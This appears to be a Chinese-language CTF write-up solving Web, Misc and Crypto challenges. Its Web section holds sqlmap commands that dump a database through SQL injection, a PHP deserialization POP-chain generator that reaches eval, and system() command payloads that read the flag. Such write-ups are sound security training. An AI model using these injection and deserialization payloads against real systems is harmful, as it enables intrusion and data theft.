## **Web**

### Signin2

输入"Signin"，查看响应头，发现 set-cookie 里有 flag。

<img src="images/image-20221126143042789.png" alt="image-20221126143042789" style="zoom: 33%;" />

### easy 简单的越权

进入网页给了 plaintext 响应：

<img src="images/image-20221126143315987.png" alt="image-20221126143315987" style="zoom:50%;" />

查看 cookie：

<img src="images/image-20221126143348444.png" alt="image-20221126143348444" style="zoom: 33%;" />

将值改为 admin 再刷新网页即可。

### WEB3

提示访问 source，那就看看 source：

<img src="images/image-20221126143642711.png" alt="image-20221126143642711" style="zoom:50%;" />

session_id 处有明显的 SQL 注入漏洞，使用 sqlmap 进行攻击：

<img src="images/image-20221126144119110.png" alt="image-20221126144119110" style="zoom: 50%;" />

看到 session_id 确实可以注入，我们继续：

<img src="images/image-20221126144209722.png" alt="image-20221126144209722" style="zoom:50%;" />

得知 session_id 可以 UNION 注入攻击。使用漏洞查看数据库：

`python sqlmap.py -u http://29c01baa33a0d47f.node.nsctf.cn --method=POST --data="session_id=xxx" --current-db` 得知数据库名 `level1`

`python sqlmap.py -u http://29c01baa33a0d47f.node.nsctf.cn --method=POST --data="session_id=xxx" -D level1 --tables` 得知表名 `secrets`

进行 dump：`python sqlmap.py -u http://29c01baa33a0d47f.node.nsctf.cn --method=POST --data="session_id=xxx" -D level1 -T secrets --dump`

<img src="images/image-20221126144904238.png" alt="image-20221126144904238" style="zoom:50%;" />

### pop

源码里出现了 include，用伪协议读一下 `index.php`：

<img src="images/image-20221126145745862.png" alt="image-20221126145745862" style="zoom: 50%;" />

base64 解码得到源码：

```php
<?php
class Tiger{
    public $string;
    protected $var;
    public function __toString(){
        return $this->string;
    }
    public function boss($value){
        @eval($value);
    }
    public function __invoke(){
        $this->boss($this->var);
    }
}

class Lion{
    public $tail;
    public function __construct(){
        $this->tail = array();
    }
    public function __get($value){
        $function = $this->tail;
        return $function();
    }
}


class Monkey{
    public $head;
    public $hand;
    public function __construct($here="Zoo"){
        $this->head = $here;
        echo "Welcome to ".$this->head."<br>";
    }
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->head)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Elephant{
    public $nose;
    public $nice;
    public function __construct($nice="nice"){
        $this->nice = $nice;
        echo $nice;
    }
    public function __toString(){
        return $this->nice->nose;
    }
}

if(isset($_POST['zoo'])){
    @unserialize($_POST['zoo']);
}
else{
    $a = new Monkey;
    echo "hint in hint.php!";
}
?>
```

构造 pop 链生成器：

```php
<?php
class Tiger {
    public $string;
    // 注意最后是有一个分号的
    protected $var = "system('ls');";
}

class Lion {
    public $tail;
    public function __construct(){
        $this->tail = array();
    }
}

class Elephant {
    public $nose;
    public $nice;
    public function __construct($nice="nice") {
        $this->nice = $nice;
    }
}

class Monkey {
    public $head;
    public $hand;
    public function __construct($here="Zoo"){
        $this->head = $here;
    }
}

$a = new Elephant;
$a->nice = new Lion;
$a->nice->tail = new Tiger;

$b = new Monkey($a);

// 要 POST 所以要进行 URL 编码
// Content-Type: application/x-www-form-urlencoded
$c = urlencode(serialize($b));
echo $c;

?>
```

拿到 payload POST 到 `index.php`：

<img src="images/image-20221126150119262.png" alt="image-20221126150119262" style="zoom: 50%;" />

构造 payload `system('ls\$IFS/')`

<img src="images/image-20221126150546665.png" alt="image-20221126150546665" style="zoom:50%;" />

最终构造 payload `system('cat\$IFS/f14g')`即可得到 flag。

## **Misc**

### txt

解压后得到的文件以 txt 模式打开即可得到 flag。

### 流量包

导入 wireshark，目测一下然后过滤域名 `www.wooyun.org`

<img src="images/image-20221126151830638.png" alt="image-20221126151830638" style="zoom: 33%;" />

打开 login 这条 POST 请求包，查看 form data：

<img src="images/image-20221126152125974.png" alt="image-20221126152125974" style="zoom:33%;" />

password 即为 flag 里面的值。

### Search evidence

<img src="images/image-20221126154658549.png" alt="image-20221126154658549" style="zoom: 33%;" />

winrar 打开注释拉到最右边可以看到解压密码。

exe 运行不了，`file`命令看看文件格式：

<img src="images/image-20221126154907058.png" alt="image-20221126154907058" style="zoom:50%;" />

然后查维基，尝试使用 DOSBox 运行程序。

<img src="images/image-20221126154235791.png" alt="image-20221126154235791" style="zoom: 50%;" />

程序卡住，原因未知。

<img src="images/image-20221126154105216.png" alt="image-20221126154105216" style="zoom: 67%;" />

直接查看二进制，发现了类似 flag 的东西，去掉异常字符后这就是最终 flag。

<img src="images/image-20221126154218071.png" alt="image-20221126154218071" style="zoom:50%;" />

## **Crypto**

### Encode

解压文件是 0 和 1 的 txt 格式文件。长度正好为 25*8=200，每 8 个 bit 可以转化为 hex 对应一个 ASCII。

![image-20221126160159022](images/image-20221126160159022.png)

最后执行一次 join 即可得到 flag。

### 简单的密码

解压得到如下文件，猜测为莫斯密码，将 A 替换为 `.`，将 B 替换为 `-`，将空格替换为 `/`即可得到莫斯编码。

<img src="images/image-20221126160442661.png" alt="image-20221126160442661" style="zoom:50%;" />

得到莫斯编码 `-.../----./-----/-----/-----/-.-./---../-----/--.../..---/....-/---../-.../....-/..-./--..././-.../-.../..---/--.../----./-..././....-/.-/.-/-..../-../..---/..---/-.-.`

解码：

<img src="images/image-20221126160645138.png" alt="image-20221126160645138" style="zoom:50%;" />

根据题目提示 32 位小写字符串进行转换即可。

<img src="images/image-20221126160658495.png" alt="image-20221126160658495" style="zoom:50%;" />

